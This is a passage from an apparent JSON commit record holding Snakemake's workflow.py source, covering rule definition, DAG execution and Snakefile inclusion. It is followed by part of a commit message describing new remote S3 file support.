False dag=DAG( self, rules, dryrun=dryrun, targetfiles=targetfiles, targetrules=targetrules, forceall=forceall, forcefiles=forcefiles, forcerules=forcerules, priorityfiles=priorityfiles, priorityrules=priorityrules, ignore_ambiguity=ignore_ambiguity, force_incomplete=force_incomplete, ignore_incomplete=ignore_incomplete or printdag or printrulegraph, notemp=notemp) self.persistence=Persistence( nolock=nolock, dag=dag, warn_only=dryrun or printrulegraph or printdag or summary or list_version_changes or list_code_changes or list_input_changes or list_params_changes) if cleanup_metadata: for f in cleanup_metadata: self.persistence.cleanup_metadata(f) return True dag.init() dag.check_dynamic() if unlock: try: self.persistence.cleanup_locks() logger.info(\"Unlocking working directory.\") return True except IOError: logger.error(\"Error: Unlocking the directory{} failed. Maybe \" \"you don't have the permissions?\") return False try: self.persistence.lock() except IOError: logger.error( \"Error: Directory cannot be locked. Please make \" \"sure that no other Snakemake process is trying to create \" \"the same files in the following directory:\\n{}\\n\" \"If you are sure that no other \" \"instances of snakemake are running on this directory, \" \"the remaining lock was likely caused by a kill signal or \" \"a power loss. It can be removed with \" \"the --unlock argument.\".format(os.getcwd())) return False if self.subworkflows and not printdag and not printrulegraph: globals_backup=dict(self.globals) for subworkflow in self.subworkflows: subworkflow_targets=subworkflow.targets(dag) updated=list() if subworkflow_targets: logger.info( \"Executing subworkflow{}.\".format(subworkflow.name)) if not subsnakemake(subworkflow.snakefile, workdir=subworkflow.workdir, targets=subworkflow_targets, updated_files=updated): return False dag.updated_subworkflow_files.update(subworkflow.target(f) for f in updated) else: logger.info(\"Subworkflow{}: Nothing to be done.\".format( subworkflow.name)) if self.subworkflows: logger.info(\"Executing main workflow.\") self.globals.update(globals_backup) dag.check_incomplete() dag.postprocess() if nodeps: missing_input=[f for job in dag.targetjobs for f in job.input if dag.needrun(job) and not os.path.exists(f)] if missing_input: logger.error( \"Dependency resolution disabled(--nodeps) \" \"but missing input \" \"files detected. If this happens on a cluster, please make sure \" \"that you handle the dependencies yourself or turn of \" \"--immediate-submit. Missing input files:\\n{}\".format( \"\\n\".join(missing_input))) return False updated_files.extend(f for job in dag.needrun_jobs for f in job.output) if printd3dag: dag.d3dag() return True elif printdag: print(dag) return True elif printrulegraph: print(dag.rule_dot()) return True elif summary: print(\"\\n\".join(dag.summary(detailed=False))) return True elif detailed_summary: print(\"\\n\".join(dag.summary(detailed=True))) return True elif list_version_changes: items=list( chain(*map(self.persistence.version_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_code_changes: items=list(chain(*map(self.persistence.code_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_input_changes: items=list(chain(*map(self.persistence.input_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_params_changes: items=list( chain(*map(self.persistence.params_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True scheduler=JobScheduler(self, dag, cores, local_cores=local_cores, dryrun=dryrun, touch=touch, cluster=cluster, cluster_config=cluster_config, cluster_sync=cluster_sync, jobname=jobname, immediate_submit=immediate_submit, quiet=quiet, keepgoing=keepgoing, drmaa=drmaa, printreason=printreason, printshellcmds=printshellcmds, latency_wait=latency_wait, benchmark_repeats=benchmark_repeats, greediness=greediness) if not dryrun and not quiet: if len(dag): if cluster or cluster_sync or drmaa: logger.resources_info( \"Provided cluster nodes:{}\".format(nodes)) else: logger.resources_info(\"Provided cores:{}\".format(cores)) logger.resources_info(\"Rules claiming more threads will be scaled down.\") provided_resources=format_resources(resources) if provided_resources: logger.resources_info( \"Provided resources: \" +provided_resources) ignored_resources=format_resource_names( set(resource for job in dag.needrun_jobs for resource in job.resources_dict if resource not in resources)) if ignored_resources: logger.resources_info( \"Ignored resources: \" +ignored_resources) logger.run_info(\"\\n\".join(dag.stats())) else: logger.info(\"Nothing to be done.\") if dryrun and not len(dag): logger.info(\"Nothing to be done.\") success=scheduler.schedule() if success: if dryrun: if not quiet and len(dag): logger.run_info(\"\\n\".join(dag.stats())) elif stats: scheduler.stats.to_json(stats) if not dryrun and not no_hooks: self._onsuccess(logger.get_logfile()) return True else: if not dryrun and not no_hooks: self._onerror(logger.get_logfile()) return False def include(self, snakefile, overwrite_first_rule=False, print_compilation=False, overwrite_shellcmd=None): \"\"\" Include a snakefile. \"\"\" if not urllib.parse.urlparse(snakefile).scheme: if not os.path.isabs(snakefile) and self.included_stack: current_path=os.path.dirname(self.included_stack[-1]) snakefile=os.path.join(current_path, snakefile) snakefile=os.path.abspath(snakefile) if snakefile in self.included: logger.info(\"Multiple include of{} ignored\".format(snakefile)) return self.included.append(snakefile) self.included_stack.append(snakefile) global workflow workflow=self first_rule=self.first_rule code, linemap=parse(snakefile, overwrite_shellcmd=self.overwrite_shellcmd) if print_compilation: print(code) sys.path.insert(0, os.path.dirname(snakefile)) self.linemaps[snakefile]=linemap exec(compile(code, snakefile, \"exec\"), self.globals) if not overwrite_first_rule: self.first_rule=first_rule self.included_stack.pop() def onsuccess(self, func): self._onsuccess=func def onerror(self, func): self._onerror=func def workdir(self, workdir): if self.overwrite_workdir is None: if not os.path.exists(workdir): os.makedirs(workdir) self._workdir=workdir os.chdir(workdir) def configfile(self, jsonpath): \"\"\" Update the global config with the given dictionary. \"\"\" global config c=snakemake.io.load_configfile(jsonpath) update_config(config, c) update_config(config, self.overwrite_config) def ruleorder(self, *rulenames): self._ruleorder.add(*rulenames) def subworkflow(self, name, snakefile=None, workdir=None): sw=Subworkflow(self, name, snakefile, workdir) self._subworkflows[name]=sw self.globals[name]=sw.target def localrules(self, *rulenames): self._localrules.update(rulenames) def rule(self, name=None, lineno=None, snakefile=None): name=self.add_rule(name, lineno, snakefile) rule=self.get_rule(name) def decorate(ruleinfo): if ruleinfo.input: rule.set_input(*ruleinfo.input[0], **ruleinfo.input[1]) if ruleinfo.output: rule.set_output(*ruleinfo.output[0], **ruleinfo.output[1]) if ruleinfo.params: rule.set_params(*ruleinfo.params[0], **ruleinfo.params[1]) if ruleinfo.threads: if not isinstance(ruleinfo.threads, int): raise RuleException(\"Threads value has to be an integer.\", rule=rule) rule.resources[\"_cores\"]=ruleinfo.threads if ruleinfo.resources: args, resources=ruleinfo.resources if args: raise RuleException(\"Resources have to be named.\") if not all(map(lambda r: isinstance(r, int), resources.values())): raise RuleException( \"Resources values have to be integers.\", rule=rule) rule.resources.update(resources) if ruleinfo.priority: if(not isinstance(ruleinfo.priority, int) and not isinstance(ruleinfo.priority, float)): raise RuleException(\"Priority values have to be numeric.\", rule=rule) rule.priority=ruleinfo.priority if ruleinfo.version: rule.version=ruleinfo.version if ruleinfo.log: rule.set_log(*ruleinfo.log[0], **ruleinfo.log[1]) if ruleinfo.message: rule.message=ruleinfo.message if ruleinfo.benchmark: rule.benchmark=ruleinfo.benchmark rule.norun=ruleinfo.norun rule.docstring=ruleinfo.docstring rule.run_func=ruleinfo.func rule.shellcmd=ruleinfo.shellcmd ruleinfo.func.__name__=\"__{}\".format(name) self.globals[ruleinfo.func.__name__]=ruleinfo.func setattr(rules, name, rule) return ruleinfo.func return decorate def docstring(self, string): def decorate(ruleinfo): ruleinfo.docstring=string return ruleinfo return decorate def input(self, *paths, **kwpaths): def decorate(ruleinfo): ruleinfo.input=(paths, kwpaths) return ruleinfo return decorate def output(self, *paths, **kwpaths): def decorate(ruleinfo): ruleinfo.output=(paths, kwpaths) return ruleinfo return decorate def params(self, *params, **kwparams): def decorate(ruleinfo): ruleinfo.params=(params, kwparams) return ruleinfo return decorate def message(self, message): def decorate(ruleinfo): ruleinfo.message=message return ruleinfo return decorate def benchmark(self, benchmark): def decorate(ruleinfo): ruleinfo.benchmark=benchmark return ruleinfo return decorate def threads(self, threads): def decorate(ruleinfo): ruleinfo.threads=threads return ruleinfo return decorate def resources(self, *args, **resources): def decorate(ruleinfo): ruleinfo.resources=(args, resources) return ruleinfo return decorate def priority(self, priority): def decorate(ruleinfo): ruleinfo.priority=priority return ruleinfo return decorate def version(self, version): def decorate(ruleinfo): ruleinfo.version=version return ruleinfo return decorate def log(self, *logs, **kwlogs): def decorate(ruleinfo): ruleinfo.log=(logs, kwlogs) return ruleinfo return decorate def shellcmd(self, cmd): def decorate(ruleinfo): ruleinfo.shellcmd=cmd return ruleinfo return decorate def norun(self): def decorate(ruleinfo): ruleinfo.norun=True return ruleinfo return decorate def run(self, func): return RuleInfo(func) @staticmethod def _empty_decorator(f): return f class RuleInfo: def __init__(self, func): self.func=func self.shellcmd=None self.norun=False self.input=None self.output=None self.params=None self.message=None self.benchmark=None self.threads=None self.resources=None self.priority=None self.version=None self.log=None self.docstring=None class Subworkflow: def __init__(self, workflow, name, snakefile, workdir): self.workflow=workflow self.name=name self._snakefile=snakefile self._workdir=workdir @property def snakefile(self): if self._snakefile is None: return os.path.abspath(os.path.join(self.workdir, \"Snakefile\")) if not os.path.isabs(self._snakefile): return os.path.abspath(os.path.join(self.workflow.basedir, self._snakefile)) return self._snakefile @property def workdir(self): workdir=\".\" if self._workdir is None else self._workdir if not os.path.isabs(workdir): return os.path.abspath(os.path.join(self.workflow.basedir, workdir)) return workdir def target(self, paths): if not_iterable(paths): return flag(os.path.join(self.workdir, paths), \"subworkflow\", self) return[self.target(path) for path in paths] def targets(self, dag): return[f for job in dag.jobs for f in job.subworkflow_input if job.subworkflow_input[f] is self] class Rules: \"\"\" A namespace for rules so that they can be accessed via dot notation. \"\"\" pass def srcdir(path): \"\"\"Return the absolute path, relative to the source directory of the current Snakefile.\"\"\" if not workflow.included_stack: return None return os.path.join(os.path.dirname(workflow.included_stack[-1]), path) ", "sourceWithComments": "__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport re\nimport os\nimport sys\nimport signal\nimport json\nimport urllib\nfrom collections import OrderedDict\nfrom itertools import filterfalse, chain\nfrom functools import partial\nfrom operator import attrgetter\n\nfrom snakemake.logging import logger, format_resources, format_resource_names\nfrom snakemake.rules import Rule, Ruleorder\nfrom snakemake.exceptions import RuleException, CreateRuleException, \\\n    UnknownRuleException, NoRulesException, print_exception, WorkflowError\nfrom snakemake.shell import shell\nfrom snakemake.dag import DAG\nfrom snakemake.scheduler import JobScheduler\nfrom snakemake.parser import parse\nimport snakemake.io\nfrom snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\nfrom snakemake.persistence import Persistence\nfrom snakemake.utils import update_config\n\n\nclass Workflow:\n    def __init__(self,\n                 snakefile=None,\n                 snakemakepath=None,\n                 jobscript=None,\n                 overwrite_shellcmd=None,\n                 overwrite_config=dict(),\n                 overwrite_workdir=None,\n                 overwrite_configfile=None,\n                 config_args=None,\n                 debug=False):\n        \"\"\"\n        Create the controller.\n        \"\"\"\n        self._rules = OrderedDict()\n        self.first_rule = None\n        self._workdir = None\n        self.overwrite_workdir = overwrite_workdir\n        self.workdir_init = os.path.abspath(os.curdir)\n        self._ruleorder = Ruleorder()\n        self._localrules = set()\n        self.linemaps = dict()\n        self.rule_count = 0\n        self.basedir = os.path.dirname(snakefile)\n        self.snakefile = os.path.abspath(snakefile)\n        self.snakemakepath = snakemakepath\n        self.included = []\n        self.included_stack = []\n        self.jobscript = jobscript\n        self.persistence = None\n        self.global_resources = None\n        self.globals = globals()\n        self._subworkflows = dict()\n        self.overwrite_shellcmd = overwrite_shellcmd\n        self.overwrite_config = overwrite_config\n        self.overwrite_configfile = overwrite_configfile\n        self.config_args = config_args\n        self._onsuccess = lambda log: None\n        self._onerror = lambda log: None\n        self.debug = debug\n\n        global config\n        config = dict()\n        config.update(self.overwrite_config)\n\n        global rules\n        rules = Rules()\n\n    @property\n    def subworkflows(self):\n        return self._subworkflows.values()\n\n    @property\n    def rules(self):\n        return self._rules.values()\n\n    @property\n    def concrete_files(self):\n        return (\n            file\n            for rule in self.rules for file in chain(rule.input, rule.output)\n            if not callable(file) and not file.contains_wildcard()\n        )\n\n    def check(self):\n        for clause in self._ruleorder:\n            for rulename in clause:\n                if not self.is_rule(rulename):\n                    raise UnknownRuleException(\n                        rulename,\n                        prefix=\"Error in ruleorder definition.\")\n\n    def add_rule(self, name=None, lineno=None, snakefile=None):\n        \"\"\"\n        Add a rule.\n        \"\"\"\n        if name is None:\n            name = str(len(self._rules) + 1)\n        if self.is_rule(name):\n            raise CreateRuleException(\n                \"The name {} is already used by another rule\".format(name))\n        rule = Rule(name, self, lineno=lineno, snakefile=snakefile)\n        self._rules[rule.name] = rule\n        self.rule_count += 1\n        if not self.first_rule:\n            self.first_rule = rule.name\n        return name\n\n    def is_rule(self, name):\n        \"\"\"\n        Return True if name is the name of a rule.\n\n        Arguments\n        name -- a name\n        \"\"\"\n        return name in self._rules\n\n    def get_rule(self, name):\n        \"\"\"\n        Get rule by name.\n\n        Arguments\n        name -- the name of the rule\n        \"\"\"\n        if not self._rules:\n            raise NoRulesException()\n        if not name in self._rules:\n            raise UnknownRuleException(name)\n        return self._rules[name]\n\n    def list_rules(self, only_targets=False):\n        rules = self.rules\n        if only_targets:\n            rules = filterfalse(Rule.has_wildcards, rules)\n        for rule in rules:\n            logger.rule_info(name=rule.name, docstring=rule.docstring)\n\n    def list_resources(self):\n        for resource in set(\n            resource for rule in self.rules for resource in rule.resources):\n            if resource not in \"_cores _nodes\".split():\n                logger.info(resource)\n\n    def is_local(self, rule):\n        return rule.name in self._localrules or rule.norun\n\n    def execute(self,\n                targets=None,\n                dryrun=False,\n                touch=False,\n                cores=1,\n                nodes=1,\n                local_cores=1,\n                forcetargets=False,\n                forceall=False,\n                forcerun=None,\n                prioritytargets=None,\n                quiet=False,\n                keepgoing=False,\n                printshellcmds=False,\n                printreason=False,\n                printdag=False,\n                cluster=None,\n                cluster_config=None,\n                cluster_sync=None,\n                jobname=None,\n                immediate_submit=False,\n                ignore_ambiguity=False,\n                printrulegraph=False,\n                printd3dag=False,\n                drmaa=None,\n                stats=None,\n                force_incomplete=False,\n                ignore_incomplete=False,\n                list_version_changes=False,\n                list_code_changes=False,\n                list_input_changes=False,\n                list_params_changes=False,\n                summary=False,\n                detailed_summary=False,\n                latency_wait=3,\n                benchmark_repeats=3,\n                wait_for_files=None,\n                nolock=False,\n                unlock=False,\n                resources=None,\n                notemp=False,\n                nodeps=False,\n                cleanup_metadata=None,\n                subsnakemake=None,\n                updated_files=None,\n                keep_target_files=False,\n                allowed_rules=None,\n                greediness=1.0,\n                no_hooks=False):\n\n        self.global_resources = dict() if resources is None else resources\n        self.global_resources[\"_cores\"] = cores\n        self.global_resources[\"_nodes\"] = nodes\n\n        def rules(items):\n            return map(self._rules.__getitem__, filter(self.is_rule, items))\n\n        if keep_target_files:\n\n            def files(items):\n                return filterfalse(self.is_rule, items)\n        else:\n\n            def files(items):\n                return map(os.path.relpath, filterfalse(self.is_rule, items))\n\n        if not targets:\n            targets = [self.first_rule\n                       ] if self.first_rule is not None else list()\n        if prioritytargets is None:\n            prioritytargets = list()\n        if forcerun is None:\n            forcerun = list()\n\n        priorityrules = set(rules(prioritytargets))\n        priorityfiles = set(files(prioritytargets))\n        forcerules = set(rules(forcerun))\n        forcefiles = set(files(forcerun))\n        targetrules = set(chain(rules(targets),\n                                filterfalse(Rule.has_wildcards, priorityrules),\n                                filterfalse(Rule.has_wildcards, forcerules)))\n        targetfiles = set(chain(files(targets), priorityfiles, forcefiles))\n        if forcetargets:\n            forcefiles.update(targetfiles)\n            forcerules.update(targetrules)\n\n        rules = self.rules\n        if allowed_rules:\n            rules = [rule for rule in rules if rule.name in set(allowed_rules)]\n\n        if wait_for_files is not None:\n            try:\n                snakemake.io.wait_for_files(wait_for_files,\n                                            latency_wait=latency_wait)\n            except IOError as e:\n                logger.error(str(e))\n                return False\n\n        dag = DAG(\n            self, rules,\n            dryrun=dryrun,\n            targetfiles=targetfiles,\n            targetrules=targetrules,\n            forceall=forceall,\n            forcefiles=forcefiles,\n            forcerules=forcerules,\n            priorityfiles=priorityfiles,\n            priorityrules=priorityrules,\n            ignore_ambiguity=ignore_ambiguity,\n            force_incomplete=force_incomplete,\n            ignore_incomplete=ignore_incomplete or printdag or printrulegraph,\n            notemp=notemp)\n\n        self.persistence = Persistence(\n            nolock=nolock,\n            dag=dag,\n            warn_only=dryrun or printrulegraph or printdag or summary or\n            list_version_changes or list_code_changes or list_input_changes or\n            list_params_changes)\n\n        if cleanup_metadata:\n            for f in cleanup_metadata:\n                self.persistence.cleanup_metadata(f)\n            return True\n\n        dag.init()\n        dag.check_dynamic()\n\n        if unlock:\n            try:\n                self.persistence.cleanup_locks()\n                logger.info(\"Unlocking working directory.\")\n                return True\n            except IOError:\n                logger.error(\"Error: Unlocking the directory {} failed. Maybe \"\n                             \"you don't have the permissions?\")\n                return False\n        try:\n            self.persistence.lock()\n        except IOError:\n            logger.error(\n                \"Error: Directory cannot be locked. Please make \"\n                \"sure that no other Snakemake process is trying to create \"\n                \"the same files in the following directory:\\n{}\\n\"\n                \"If you are sure that no other \"\n                \"instances of snakemake are running on this directory, \"\n                \"the remaining lock was likely caused by a kill signal or \"\n                \"a power loss. It can be removed with \"\n                \"the --unlock argument.\".format(os.getcwd()))\n            return False\n\n        if self.subworkflows and not printdag and not printrulegraph:\n            # backup globals\n            globals_backup = dict(self.globals)\n            # execute subworkflows\n            for subworkflow in self.subworkflows:\n                subworkflow_targets = subworkflow.targets(dag)\n                updated = list()\n                if subworkflow_targets:\n                    logger.info(\n                        \"Executing subworkflow {}.\".format(subworkflow.name))\n                    if not subsnakemake(subworkflow.snakefile,\n                                        workdir=subworkflow.workdir,\n                                        targets=subworkflow_targets,\n                                        updated_files=updated):\n                        return False\n                    dag.updated_subworkflow_files.update(subworkflow.target(f)\n                                                         for f in updated)\n                else:\n                    logger.info(\"Subworkflow {}: Nothing to be done.\".format(\n                        subworkflow.name))\n            if self.subworkflows:\n                logger.info(\"Executing main workflow.\")\n            # rescue globals\n            self.globals.update(globals_backup)\n\n        dag.check_incomplete()\n        dag.postprocess()\n\n        if nodeps:\n            missing_input = [f for job in dag.targetjobs for f in job.input\n                             if dag.needrun(job) and not os.path.exists(f)]\n            if missing_input:\n                logger.error(\n                    \"Dependency resolution disabled (--nodeps) \"\n                    \"but missing input \"\n                    \"files detected. If this happens on a cluster, please make sure \"\n                    \"that you handle the dependencies yourself or turn of \"\n                    \"--immediate-submit. Missing input files:\\n{}\".format(\n                        \"\\n\".join(missing_input)))\n                return False\n\n        updated_files.extend(f for job in dag.needrun_jobs for f in job.output)\n\n        if printd3dag:\n            dag.d3dag()\n            return True\n        elif printdag:\n            print(dag)\n            return True\n        elif printrulegraph:\n            print(dag.rule_dot())\n            return True\n        elif summary:\n            print(\"\\n\".join(dag.summary(detailed=False)))\n            return True\n        elif detailed_summary:\n            print(\"\\n\".join(dag.summary(detailed=True)))\n            return True\n        elif list_version_changes:\n            items = list(\n                chain(*map(self.persistence.version_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_code_changes:\n            items = list(chain(*map(self.persistence.code_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_input_changes:\n            items = list(chain(*map(self.persistence.input_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_params_changes:\n            items = list(\n                chain(*map(self.persistence.params_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n\n        scheduler = JobScheduler(self, dag, cores,\n                                 local_cores=local_cores,\n                                 dryrun=dryrun,\n                                 touch=touch,\n                                 cluster=cluster,\n                                 cluster_config=cluster_config,\n                                 cluster_sync=cluster_sync,\n                                 jobname=jobname,\n                                 immediate_submit=immediate_submit,\n                                 quiet=quiet,\n                                 keepgoing=keepgoing,\n                                 drmaa=drmaa,\n                                 printreason=printreason,\n                                 printshellcmds=printshellcmds,\n                                 latency_wait=latency_wait,\n                                 benchmark_repeats=benchmark_repeats,\n                                 greediness=greediness)\n\n        if not dryrun and not quiet:\n            if len(dag):\n                if cluster or cluster_sync or drmaa:\n                    logger.resources_info(\n                        \"Provided cluster nodes: {}\".format(nodes))\n                else:\n                    logger.resources_info(\"Provided cores: {}\".format(cores))\n                    logger.resources_info(\"Rules claiming more threads will be scaled down.\")\n                provided_resources = format_resources(resources)\n                if provided_resources:\n                    logger.resources_info(\n                        \"Provided resources: \" + provided_resources)\n                ignored_resources = format_resource_names(\n                    set(resource for job in dag.needrun_jobs for resource in\n                        job.resources_dict if resource not in resources))\n                if ignored_resources:\n                    logger.resources_info(\n                        \"Ignored resources: \" + ignored_resources)\n                logger.run_info(\"\\n\".join(dag.stats()))\n            else:\n                logger.info(\"Nothing to be done.\")\n        if dryrun and not len(dag):\n            logger.info(\"Nothing to be done.\")\n\n        success = scheduler.schedule()\n\n        if success:\n            if dryrun:\n                if not quiet and len(dag):\n                    logger.run_info(\"\\n\".join(dag.stats()))\n            elif stats:\n                scheduler.stats.to_json(stats)\n            if not dryrun and not no_hooks:\n                self._onsuccess(logger.get_logfile())\n            return True\n        else:\n            if not dryrun and not no_hooks:\n                self._onerror(logger.get_logfile())\n            return False\n\n    def include(self, snakefile,\n                overwrite_first_rule=False,\n                print_compilation=False,\n                overwrite_shellcmd=None):\n        \"\"\"\n        Include a snakefile.\n        \"\"\"\n        # check if snakefile is a path to the filesystem\n        if not urllib.parse.urlparse(snakefile).scheme:\n            if not os.path.isabs(snakefile) and self.included_stack:\n                current_path = os.path.dirname(self.included_stack[-1])\n                snakefile = os.path.join(current_path, snakefile)\n            snakefile = os.path.abspath(snakefile)\n        # else it could be an url.\n        # at least we don't want to modify the path for clarity.\n\n        if snakefile in self.included:\n            logger.info(\"Multiple include of {} ignored\".format(snakefile))\n            return\n        self.included.append(snakefile)\n        self.included_stack.append(snakefile)\n\n        global workflow\n\n        workflow = self\n\n        first_rule = self.first_rule\n        code, linemap = parse(snakefile,\n                              overwrite_shellcmd=self.overwrite_shellcmd)\n\n        if print_compilation:\n            print(code)\n\n        # insert the current directory into sys.path\n        # this allows to import modules from the workflow directory\n        sys.path.insert(0, os.path.dirname(snakefile))\n\n        self.linemaps[snakefile] = linemap\n        exec(compile(code, snakefile, \"exec\"), self.globals)\n        if not overwrite_first_rule:\n            self.first_rule = first_rule\n        self.included_stack.pop()\n\n    def onsuccess(self, func):\n        self._onsuccess = func\n\n    def onerror(self, func):\n        self._onerror = func\n\n    def workdir(self, workdir):\n        if self.overwrite_workdir is None:\n            if not os.path.exists(workdir):\n                os.makedirs(workdir)\n            self._workdir = workdir\n            os.chdir(workdir)\n\n    def configfile(self, jsonpath):\n        \"\"\" Update the global config with the given dictionary. \"\"\"\n        global config\n        c = snakemake.io.load_configfile(jsonpath)\n        update_config(config, c)\n        update_config(config, self.overwrite_config)\n\n    def ruleorder(self, *rulenames):\n        self._ruleorder.add(*rulenames)\n\n    def subworkflow(self, name, snakefile=None, workdir=None):\n        sw = Subworkflow(self, name, snakefile, workdir)\n        self._subworkflows[name] = sw\n        self.globals[name] = sw.target\n\n    def localrules(self, *rulenames):\n        self._localrules.update(rulenames)\n\n    def rule(self, name=None, lineno=None, snakefile=None):\n        name = self.add_rule(name, lineno, snakefile)\n        rule = self.get_rule(name)\n\n        def decorate(ruleinfo):\n            if ruleinfo.input:\n                rule.set_input(*ruleinfo.input[0], **ruleinfo.input[1])\n            if ruleinfo.output:\n                rule.set_output(*ruleinfo.output[0], **ruleinfo.output[1])\n            if ruleinfo.params:\n                rule.set_params(*ruleinfo.params[0], **ruleinfo.params[1])\n            if ruleinfo.threads:\n                if not isinstance(ruleinfo.threads, int):\n                    raise RuleException(\"Threads value has to be an integer.\",\n                                        rule=rule)\n                rule.resources[\"_cores\"] = ruleinfo.threads\n            if ruleinfo.resources:\n                args, resources = ruleinfo.resources\n                if args:\n                    raise RuleException(\"Resources have to be named.\")\n                if not all(map(lambda r: isinstance(r, int),\n                               resources.values())):\n                    raise RuleException(\n                        \"Resources values have to be integers.\",\n                        rule=rule)\n                rule.resources.update(resources)\n            if ruleinfo.priority:\n                if (not isinstance(ruleinfo.priority, int) and\n                    not isinstance(ruleinfo.priority, float)):\n                    raise RuleException(\"Priority values have to be numeric.\",\n                                        rule=rule)\n                rule.priority = ruleinfo.priority\n            if ruleinfo.version:\n                rule.version = ruleinfo.version\n            if ruleinfo.log:\n                rule.set_log(*ruleinfo.log[0], **ruleinfo.log[1])\n            if ruleinfo.message:\n                rule.message = ruleinfo.message\n            if ruleinfo.benchmark:\n                rule.benchmark = ruleinfo.benchmark\n            rule.norun = ruleinfo.norun\n            rule.docstring = ruleinfo.docstring\n            rule.run_func = ruleinfo.func\n            rule.shellcmd = ruleinfo.shellcmd\n            ruleinfo.func.__name__ = \"__{}\".format(name)\n            self.globals[ruleinfo.func.__name__] = ruleinfo.func\n            setattr(rules, name, rule)\n            return ruleinfo.func\n\n        return decorate\n\n    def docstring(self, string):\n        def decorate(ruleinfo):\n            ruleinfo.docstring = string\n            return ruleinfo\n\n        return decorate\n\n    def input(self, *paths, **kwpaths):\n        def decorate(ruleinfo):\n            ruleinfo.input = (paths, kwpaths)\n            return ruleinfo\n\n        return decorate\n\n    def output(self, *paths, **kwpaths):\n        def decorate(ruleinfo):\n            ruleinfo.output = (paths, kwpaths)\n            return ruleinfo\n\n        return decorate\n\n    def params(self, *params, **kwparams):\n        def decorate(ruleinfo):\n            ruleinfo.params = (params, kwparams)\n            return ruleinfo\n\n        return decorate\n\n    def message(self, message):\n        def decorate(ruleinfo):\n            ruleinfo.message = message\n            return ruleinfo\n\n        return decorate\n\n    def benchmark(self, benchmark):\n        def decorate(ruleinfo):\n            ruleinfo.benchmark = benchmark\n            return ruleinfo\n\n        return decorate\n\n    def threads(self, threads):\n        def decorate(ruleinfo):\n            ruleinfo.threads = threads\n            return ruleinfo\n\n        return decorate\n\n    def resources(self, *args, **resources):\n        def decorate(ruleinfo):\n            ruleinfo.resources = (args, resources)\n            return ruleinfo\n\n        return decorate\n\n    def priority(self, priority):\n        def decorate(ruleinfo):\n            ruleinfo.priority = priority\n            return ruleinfo\n\n        return decorate\n\n    def version(self, version):\n        def decorate(ruleinfo):\n            ruleinfo.version = version\n            return ruleinfo\n\n        return decorate\n\n    def log(self, *logs, **kwlogs):\n        def decorate(ruleinfo):\n            ruleinfo.log = (logs, kwlogs)\n            return ruleinfo\n\n        return decorate\n\n    def shellcmd(self, cmd):\n        def decorate(ruleinfo):\n            ruleinfo.shellcmd = cmd\n            return ruleinfo\n\n        return decorate\n\n    def norun(self):\n        def decorate(ruleinfo):\n            ruleinfo.norun = True\n            return ruleinfo\n\n        return decorate\n\n    def run(self, func):\n        return RuleInfo(func)\n\n    @staticmethod\n    def _empty_decorator(f):\n        return f\n\n\nclass RuleInfo:\n    def __init__(self, func):\n        self.func = func\n        self.shellcmd = None\n        self.norun = False\n        self.input = None\n        self.output = None\n        self.params = None\n        self.message = None\n        self.benchmark = None\n        self.threads = None\n        self.resources = None\n        self.priority = None\n        self.version = None\n        self.log = None\n        self.docstring = None\n\n\nclass Subworkflow:\n    def __init__(self, workflow, name, snakefile, workdir):\n        self.workflow = workflow\n        self.name = name\n        self._snakefile = snakefile\n        self._workdir = workdir\n\n    @property\n    def snakefile(self):\n        if self._snakefile is None:\n            return os.path.abspath(os.path.join(self.workdir, \"Snakefile\"))\n        if not os.path.isabs(self._snakefile):\n            return os.path.abspath(os.path.join(self.workflow.basedir,\n                                                self._snakefile))\n        return self._snakefile\n\n    @property\n    def workdir(self):\n        workdir = \".\" if self._workdir is None else self._workdir\n        if not os.path.isabs(workdir):\n            return os.path.abspath(os.path.join(self.workflow.basedir,\n                                                workdir))\n        return workdir\n\n    def target(self, paths):\n        if not_iterable(paths):\n            return flag(os.path.join(self.workdir, paths), \"subworkflow\", self)\n        return [self.target(path) for path in paths]\n\n    def targets(self, dag):\n        return [f for job in dag.jobs for f in job.subworkflow_input\n                if job.subworkflow_input[f] is self]\n\n\nclass Rules:\n    \"\"\" A namespace for rules so that they can be accessed via dot notation. \"\"\"\n    pass\n\n\ndef srcdir(path):\n    \"\"\"Return the absolute path, relative to the source directory of the current Snakefile.\"\"\"\n    if not workflow.included_stack:\n        return None\n    return os.path.join(os.path.dirname(workflow.included_stack[-1]), path)\n"}}, "msg": "Initial commit with support for remote files.\n\nThis introduces changes that scratch an itch within our research group for remote file support, and I hope the new functionality will be useful for others as well.\n\nWhat is it all about? Wouldn't it be wonderful if you would use Snakemake with remote data stored on Amazon S3? Imagine being able to read and write the same files as your collaborators without rsyncing files back and forth or using pricey network-attached storage. Want to output and store 1PB of small files? Want to let someone else worry about durability? Want to work with large files locally that you can store individually but that are too large in aggregate? The support for remote storage introduced with these changes will allow you do all of these things! Remote storage is initially intended to work with AWS S3 and things sporting a similar API, though it is flexible enough that would could extended it to support other remote providers. It expect you to already have an S3 bucket setup, and API credentials for it permitting read/write access.\n\nHere's how you use it:\n\nThe `Snakefile` now supports a wrapper function, `remote()`, indicating a file is on a remote storage provider (this is similar to `temp()` or `protected()`). During rule execution, the file (or object) specified, is downloaded to the `cwd`, within a sub-directory bearing the same name as the bucket. This lets you have multiple remote origins with reduced likelihood of name collisions, and allows snakemake to easily translate remote objects to local file paths. The `remote()` wrapper is mutually-exclusive with the `temp()` and `protected()` wrappers.\n\nThe implementation of all communication with the remote storage provider is specified in a class passed as a keyword argument to the remote wrapper. This class defines methods related to being a RemoteObject(). By default, the S3 provider is used and it does not need to be specified explicitly. If you are interested in creating a custom remote storage provider for whatever system you are using, implement the methods defined in the abstract base class `snakemake.remote_providers.RemoteObjectProvider`. Take a look at the S3 provider for an example implementation. To use a custom remote storage provider implementation (FTP, etc.), import it within your `Snakefile`, and set the 